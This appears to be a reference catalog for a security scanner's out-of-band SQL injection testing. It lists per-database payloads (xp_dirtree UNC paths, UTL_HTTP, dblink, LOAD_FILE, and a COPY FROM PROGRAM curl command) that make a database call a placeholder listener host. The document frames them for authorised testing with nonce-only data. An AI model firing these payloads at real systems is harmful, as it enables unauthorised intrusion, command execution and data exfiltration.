# Validated Out-of-Band (OAST) Protocols & Network Channel Catalog V2

**Document Reference:** SENTINEL-V2-OOB-19  
**Classification:** Network Interaction, Protocol Analysis, OAST Architecture & Data Protection Invariants  
**Status:** Validated & Source-Verified (V2)  

---

## 1. OAST Architectural Concept

Out-of-Band Application Security Testing (OAST) verifies SQL injection by inducing the backend database engine to initiate an outbound network request (DNS resolution, HTTP request, SMB negotiation) to an authoritative listener gateway controlled by the security auditor.

```
┌──────────────┐    1. Probe with Unique DNS Nonce      ┌──────────────┐
│  SENTINEL    ├───────────────────────────────────────►│  Web App     │
│  SCANNER     │                                        │  Server      │
└──────┬───────┘                                        └──────┬───────┘
       │                                                       │ 2. Dynamic Unsafe SQL
       │                                                       ▼
       │                                                ┌──────────────┐
       │                                                │  Database    │
       │                                                │  Engine      │
       │                                                └──────┬───────┘
       │                                                       │ 3. Native Network Call
       │                                                       ▼
       │         4. DNS Lookup Query Logged             ┌──────────────┐
       └────────────────────────────────────────────────┤ Authoritative│
                 (e.g. snt_nonce.oast.local)            │ DNS Listener │
                                                        └──────────────┘
```

---

## 2. Comprehensive DBMS-Specific OAST Primitives

| Database Engine | Native Procedure / Function | Protocol & Port | Required Privileges | Egress Filtering Sensitivity | Evidence |
|:---|:---|:---|:---|:---|:---|
| **Microsoft SQL Server** | `EXEC master..xp_dirtree '\\token.domain\share'` | SMB (445) / DNS (53) | Public (Low Privilege) | Low (DNS queries route via recursive resolvers). | **`E5`** |
| **Microsoft SQL Server** | `EXEC master..xp_fileexist '\\token.domain\share'` | SMB (445) / DNS (53) | Public (Low Privilege) | Low. | **`E5`** |
| **Oracle Database** | `UTL_INADDR.GET_HOST_NAME('token.domain')` | DNS (53) | Public (pre-11g); ACL required (11g+). | Low (Standard DNS resolution). | **`E5`** |
| **Oracle Database** | `UTL_HTTP.REQUEST('http://token.domain')` | HTTP (80) | Network ACL permission required. | Medium (Blocked by HTTP egress firewalls). | **`E5`** |
| **Oracle Database** | `DBMS_LDAP.INIT('token.domain', 389)` | LDAP (389) | Public | Medium. | **`E4`** |
| **MySQL (Windows)** | `SELECT LOAD_FILE('\\\\token.domain\\a')` | SMB (445) / DNS (53) | `FILE` privilege & `secure_file_priv=""` | Low on Windows hosts. | **`E5`** |
| **PostgreSQL** | `SELECT * FROM dblink('host=token.domain dbname=x', 'SELECT 1')` | TCP (5432) / DNS (53)| `dblink` extension installed. | Low on DNS lookup. | **`E5`** |
| **PostgreSQL (Superuser)**| `COPY tbl FROM PROGRAM 'curl http://token.domain'` | HTTP (80) | `SUPERUSER` role. | Medium. | **`E4`** |
| **ClickHouse** | `SELECT * FROM url('http://token.domain', CSV, 'c String')` | HTTP (80) | Default analytical user. | Medium. | **`E5`** |

---

## 3. Safe Verification & Data Protection Invariants

1. **Strict Nonce-Only Transmission**: Security testing must NEVER exfiltrate customer credentials, PII, or table records across public DNS recursive resolvers. The injected payload transmits solely a cryptographically random session nonce:
   ```sql
   EXEC master..xp_dirtree '\\snt_9f82bc.oast.domain\test'
   ```
2. **Environment-Dependent Egress Reality**: Outbound DNS resolution is NOT universally permitted. Air-gapped VPCs and strict cloud security groups block all outbound UDP Port 53 traffic.
3. **Session Correlation Mapping**: The authoritative listener associates the unique subdomain token (`snt_9f82bc`) with the scan session ID, target host, and parameter name, achieving confirmation with zero false positives.
